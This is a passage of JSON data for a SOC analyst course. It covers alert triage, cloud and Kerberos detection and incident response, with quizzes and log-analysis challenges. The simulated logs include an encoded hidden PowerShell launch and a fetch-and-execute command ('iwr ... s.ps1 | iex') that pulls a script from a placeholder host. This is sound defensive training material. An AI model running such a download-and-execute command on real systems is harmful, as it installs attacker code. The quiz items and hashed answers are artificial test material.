section.\u003c/p>\n\u003ch4>Triage loop\u003c/h4>\n\u003cpre>1. Pick by severity, then age. Assign to yourself.\n2. Read the rule: what exactly did it match?\n3. Context: who is the user, what is the host, is this normal for them?\n4. Evidence: pivot in SIEM around the alert time (same host, user, IP).\n5. Verdict: true positive or false positive, with the reason.\n6. Act: close with comment, or escalate with everything L2 needs.\u003c/pre>\n\u003ch4>Report template (5 Ws)\u003c/h4>\n\u003cpre>Who    user and host affected, attacker IP or sender\nWhat   what happened, in one sentence, then the evidence\nWhen   first and last activity, in UTC\nWhere  systems and network segments involved\nWhy    why you judged it TP or FP\nThen   indicators, actions taken, recommended next steps\u003c/pre>\n\u003ch4>Metrics you will hear\u003c/h4>\u003cul>\u003cli>\u003cb>MTTD\u003c/b> mean time to detect, \u003cb>MTTA\u003c/b> to acknowledge, \u003cb>MTTR\u003c/b> to respond\u003c/li>\u003cli>\u003cb>False positive rate\u003c/b>: if it is high, tune the rule; do not ignore the queue\u003c/li>\u003c/ul>\n\u003ch4>Common trap\u003c/h4>\u003cp>Vague comments such as \"looks fine, closing\". Write what you checked and what you saw, so the next person does not have to repeat it.\u003c/p>","quiz":[{"q":"Five alerts are waiting. In which order should you take them?","o":["Newest first","Highest severity first, then oldest","Random","Lowest severity first to clear the queue"],"a":1,"why":"Severity and asset criticality drive priority; age breaks ties."},{"q":"What must a good alert closing comment contain?","o":["\"Closed\"","Who, what, when, where, why, the verdict and actions taken","Only the rule name","Your shift hours"],"a":1,"why":"The 5 Ws plus verdict make the case understandable without redoing the work."},{"q":"You confirm malware beaconing from a host but cannot isolate hosts yourself. What do you do?","o":["Close as false positive","Escalate to L2 with evidence and a recommended containment","Wait until the next shift","Email the user"],"a":1,"why":"A confirmed true positive that needs action outside your permissions is the definition of an escalation."},{"q":"What does MTTD measure?","o":["Mean time to deploy","Mean time to detect","Maximum time to defend","Mean ticket duration"],"a":1,"why":"How long malicious activity runs before it is detected."},{"q":"One rule produces 95% false positives. What is the right response?","o":["Disable it silently","Tune it: add exclusions or tighten conditions, and document the change","Ignore its alerts","Raise its severity"],"a":1,"why":"Tuning keeps coverage while reducing noise."},{"q":"A phishing alert names user ana. Thirty minutes later a suspicious logon alert fires for ana. What should you do?","o":["Handle them as unrelated","Link them: they are probably one incident","Close the second one","Delete both"],"a":1,"why":"Correlating by user, host and time turns separate alerts into an attack story."},{"q":"Why convert all timestamps to UTC when building a timeline?","o":["UTC is shorter to write","Sources log in different time zones, and mixing them corrupts the order of events","SIEMs require it by law","It hides the real time"],"a":1,"why":"A single reference time zone keeps the sequence correct across systems."}],"chal":{"title":"Four alerts, four verdicts","brief":"Give a verdict for each alert using the context provided: tp or fp. Then answer the last question.","evidence":"# Reference: Northwind asset and network list\nSSO portal            login.northwind.example            (official)\nCorporate VPN egress  185.60.112.10 (Frankfurt, DE)      (official)\nFIN-PC-07             finance workstation, user m.ionescu\nHR-PC-02              HR workstation, user e.lungu\n\nALERT 1  Suspicious link in email\n  Sender it-support@northwind.example, SPF pass, DKIM pass, DMARC pass\n  Link: https://login.northwind.example/reset   Recipients: all staff (password policy reminder)\n\nALERT 2  Office application spawned PowerShell\n  Host FIN-PC-07   excel.exe -> powershell.exe -nop -w hidden -enc SQBFAFgA...\n  30 seconds later: outbound HTTPS to 91.92.240.15 (first time seen in the company)\n\nALERT 3  Impossible travel\n  User e.lungu logged in from Chisinau, MD at 09:00 and from 185.60.112.10 at 09:05\n\nALERT 4  Anomalous DNS\n  Host HR-PC-02 sent 1,900 TXT queries in 10 minutes to *.sync-cdn-data.example\n  Subdomain labels are 48 random characters. Domain registered 2 days ago.","qs":[{"p":"Alert 1 verdict (tp/fp)","h":["i8u479f3ui","1394kq9z1r0"],"hint":""},{"p":"Alert 2 verdict (tp/fp)","h":["2c665p6cz9k","sd9ii4a5wh"],"hint":""},{"p":"Alert 3 verdict (tp/fp)","h":["i8u479f3ui","1394kq9z1r0"],"hint":""},{"p":"Alert 4 verdict (tp/fp)","h":["2c665p6cz9k","sd9ii4a5wh"],"hint":""},{"p":"ATT&CK tactic for what PowerShell is doing in Alert 2 at the moment it is launched","h":["28iloimmi2r"],"hint":"One word"},{"p":"What technique does Alert 4 describe?","h":["upv8ja4qxj","266ye96ivtg","1h10ukxa866","28g2gdhvncv","u1qxcqkjad","nic2geymc7"],"hint":"Two words"}]}},{"title":"Identity is the new perimeter","module":"Cloud and Active Directory for analysts","goal":"Read cloud audit logs and Kerberos events well enough to spot account takeover, privilege escalation and Kerberoasting.","tasks":[["thm","TryHackMe: start the \"Defending AWS\" path (first module, focus on IAM and CloudTrail)",3.5],["thm","TryHackMe: room \"Active Directory Basics\", then review events 4768, 4769 and 4776 in your notes",2],["thm","TryHackMe SOC Simulator: second full scenario, timed. Compare your score with week 10",2]],"lesson":"\u003cp>Your long-term target is cloud security, and you marked cloud and AD as weak. One week will not make you an expert, but it covers what a SOC analyst is asked about them.\u003c/p>\n\u003ch4>Cloud basics\u003c/h4>\n\u003cul>\u003cli>\u003cb>Shared responsibility\u003c/b>: the provider secures the infrastructure; you secure identities, configuration and data.\u003c/li>\n\u003cli>\u003cb>IAM\u003c/b>: users, roles, policies. Least privilege always. Long-lived access keys are a liability.\u003c/li>\n\u003cli>\u003cb>Audit logs\u003c/b>: AWS CloudTrail, Azure Activity and Entra sign-in logs, GCP Cloud Audit Logs.\u003c/li>\u003c/ul>\n\u003ch4>CloudTrail events worth an alert\u003c/h4>\n\u003cpre>ConsoleLogin with MFAUsed=No from a new country\nCreateAccessKey, CreateUser, CreateLoginProfile      new credentials\nAttachUserPolicy / PutUserPolicy (AdministratorAccess) privilege escalation\nStopLogging, DeleteTrail                               covering tracks\nPutBucketPolicy / PutBucketAcl making S3 public        data exposure\nRunInstances of large GPU types in an unused region    crypto mining\u003c/pre>\n\u003ch4>Active Directory basics\u003c/h4>\n\u003cpre>Domain controller   holds accounts, issues Kerberos tickets\n4768   TGT requested (user authenticates to the domain)\n4769   service ticket requested for an SPN\n4776   NTLM credential validation\nKerberoasting   one account requests many service tickets with RC4\n                (encryption type 0x17), then cracks them offline\nPassword spray  one password tried across many accounts\nGolden ticket   forged TGT made with the krbtgt hash\u003c/pre>\n\u003ch4>Common trap\u003c/h4>\u003cp>Looking only at failed logins. In the cloud the dangerous event is often a successful login followed by quiet, legitimate-looking API calls.\u003c/p>","quiz":[{"q":"Under the shared responsibility model, what is always the customer's job?","o":["Physical data-centre security","Identity, access configuration and their own data","Hypervisor patching","Power and cooling"],"a":1,"why":"The provider secures the cloud; you secure what you put in it."},{"q":"Which AWS service records API calls made in an account?","o":["CloudWatch Metrics","CloudTrail","S3","Route 53"],"a":1,"why":"CloudTrail is the audit log of who did what, when and from where."},{"q":"What does least privilege mean?","o":["Everyone is admin for speed","Each identity gets only the permissions its task requires","Passwords under 8 characters","No one can log in"],"a":1,"why":"Fewer permissions mean less damage when an identity is compromised."},{"q":"What is Kerberoasting?","o":["Flooding the domain controller","Requesting service tickets for SPN accounts and cracking them offline","Stealing cookies","Guessing one password across many users"],"a":1,"why":"Any domain user can request the tickets; weak service account passwords fall to offline cracking."},{"q":"What does event ID 4768 show?","o":["A service was installed","A Kerberos TGT was requested","A user was deleted","The log was cleared"],"a":1,"why":"4768 is the TGT request; 4769 is a service ticket request."},{"q":"A user gets 30 MFA push prompts at night and finally approves one. What attack is this?","o":["MFA fatigue (push bombing)","Kerberoasting","SQL injection","ARP spoofing"],"a":0,"why":"The attacker already has the password and spams prompts until the user gives in."},{"q":"An S3 bucket with customer data is readable by anyone on the internet. How would you classify this?","o":["Expected behaviour","A misconfiguration causing data exposure","A DDoS attack","A Kerberos issue"],"a":1,"why":"Misconfiguration is the leading cause of cloud data leaks."}],"chal":{"title":"A quiet night in the cloud","brief":"CloudTrail events from a company AWS account, followed by one Windows observation from the same week.","evidence":"# CloudTrail (simplified), account 4410-prod, 2026-11-14 UTC\n22:41:03  ConsoleLogin        user=dev-anna      sourceIP=102.129.145.20 (new country)  MFAUsed=No   result=Success\n22:43:17  ListUsers           user=dev-anna      sourceIP=102.129.145.20\n22:44:02  CreateUser          user=dev-anna      newUser=backup-admin\n22:44:20  AttachUserPolicy    user=dev-anna      target=backup-admin  policy=AdministratorAccess\n22:44:41  CreateAccessKey     user=dev-anna      target=backup-admin\n22:47:09  StopLogging         user=backup-admin  trail=org-main-trail  sourceIP=102.129.145.20\n22:52:30  RunInstances        user=backup-admin  type=p4d.24xlarge x8  region=ap-southeast-3\n\n# Domain controller DC-01, 2026-11-15\n03:20:11 to 03:20:54  Event 4769 x 46  Account=t.rotaru  Source=10.20.4.31\n                      46 different service names, Ticket Encryption Type=0x17","qs":[{"p":"Whose credentials were compromised first?","h":["1uwenxh5jag"],"hint":""},{"p":"Which user did the attacker create for persistence?","h":["10qki4edg6a"],"hint":""},{"p":"Which policy gave it full control?","h":["1cwbp9f914d"],"hint":""},{"p":"Which API call tried to blind the defenders?","h":["26o9j571r3s"],"hint":""},{"p":"What is the likely purpose of the 22:52:30 event?","h":["dhfv3fwqzt","gu250z4iof","k1xz7dwhrm","1bklbamzemc","nxjcjb5n71","t90472vpif"],"hint":""},{"p":"Name the attack seen on DC-01","h":["1zii5pv2wus","uq8sxbg1qr"],"hint":"One word"}]}},{"title":"One incident, start to finish","module":"Incident response and capstone","goal":"Investigate a multi-stage incident across mail, endpoint, proxy and Windows logs and write the report.","tasks":[["thm","TryHackMe SOC Level 1: module \"Capstone Challenges\" (Tempest and the Boogeyman series)",6],["own","After the capstone challenge below, write a one-page incident report using the week 10 template. Keep it as a work sample",1],["own","Review tab: clear every due question before the final exam",0.5]],"lesson":"\u003cp>This week you stop learning tools and prove you can connect them. The final exam and the capstone below are the evidence that the last three months worked.\u003c/p>\n\u003ch4>Incident response phases (NIST)\u003c/h4>\n\u003cpre>1. Preparation\n2. Detection and Analysis\n3. Containment, Eradication and Recovery\n4. Post-Incident Activity (lessons learned)\u003c/pre>\n\u003ch4>Investigation method\u003c/h4>\n\u003cpre>Anchor    start from the one thing you know (an alert, a host, a time)\nPivot     same host around that time; same user; same IP or domain elsewhere\nTimeline  one line per event, UTC, source of evidence noted\nScope     which hosts and accounts are touched? search every indicator company-wide\nReport    5 Ws, indicators, actions, recommendations\u003c/pre>\n\u003ch4>Evidence rules\u003c/h4>\u003cul>\u003cli>Order of volatility: memory first, then disk. Do not reboot an infected host before memory is captured.\u003c/li>\n\u003cli>Contain before you clean: isolate the host, disable the account, block the indicators.\u003c/li>\n\u003cli>Chain of custody: record who handled which evidence and when.\u003c/li>\u003c/ul>\n\u003ch4>What next\u003c/h4>\u003cp>If you pass the final exam at 80% or above and your SOC Simulator scores are steady, you are in range for the SAL1 certification. After that, SOC Level 2 and the Defending AWS and Azure paths lead toward the cloud security role you want.\u003c/p>","quiz":[{"q":"In the NIST incident response lifecycle, what follows Detection and Analysis?","o":["Preparation","Containment, Eradication and Recovery","Post-Incident Activity","Reconnaissance"],"a":1,"why":"Preparation; Detection and Analysis; Containment, Eradication and Recovery; Post-Incident Activity."},{"q":"A host is infected with fileless malware. A technician wants to reboot it. What do you say?","o":["Go ahead","No: isolate it and capture memory first, since a reboot destroys volatile evidence","Reinstall Windows first","Unplug the monitor"],"a":1,"why":"Memory holds the running malware, keys and connections. It is gone after a reboot."},{"q":"Which evidence should be collected first?","o":["Backups","RAM","Hard disk image","Printed documents"],"a":1,"why":"Order of volatility: the most short-lived data first."},{"q":"Which is a containment action?","o":["Writing the final report","Isolating the host from the network through EDR","Holding a lessons-learned meeting","Buying new licences"],"a":1,"why":"Containment limits spread while analysis continues."},{"q":"What is the purpose of the post-incident phase?","o":["Assign blame","Improve detections, processes and defences based on what happened","Delete the logs","Close tickets faster"],"a":1,"why":"Each incident should make the next one easier to detect and handle."},{"q":"Which pattern suggests lateral movement?","o":["A user browsing the intranet","Logon type 3 from one workstation to a server with a service account, then event 7045 PSEXESVC","A DNS lookup for a news site","A failed print job"],"a":1,"why":"Network logon plus remote service creation is the PsExec signature."},{"q":"What does chain of custody document?","o":["The attacker's steps","Who collected and handled each piece of evidence, and when","The firewall rules","Staff shift patterns"],"a":1,"why":"It keeps evidence trustworthy and usable in legal or disciplinary proceedings."}],"chal":{"title":"Capstone: the Northwind incident","brief":"Four log sources, one attack. Build a timeline first, then answer. Allow 45 minutes. This is the practical half of your final test.","evidence":"# All times UTC, 2026-11-10\n\n== MAIL GATEWAY ==\n08:41:07  from=\u003chr@payro11-update.example>  to=\u003cd.rusu@northwind.example>  subject=\"Salary adjustment 2026\"  attachment=Salary_2026.xlsm  verdict=delivered\n08:41:09  from=\u003chr@payro11-update.example>  to=\u003ca.popa@northwind.example>  subject=\"Salary adjustment 2026\"  attachment=Salary_2026.xlsm  verdict=quarantined\n\n== EDR (host WS-HR-014, 10.20.4.14, user d.rusu) ==\n08:52:31  excel.exe (pid 4412) opened C:\\Users\\d.rusu\\Downloads\\Salary_2026.xlsm\n08:52:48  excel.exe -> powershell.exe -w hidden -c \"iwr http://updates.cdn-metrics.example/s.ps1 | iex\"\n08:53:02  powershell.exe wrote C:\\ProgramData\\svchost32.exe\n08:53:05  reg.exe add HKCU\\Software\\Micros
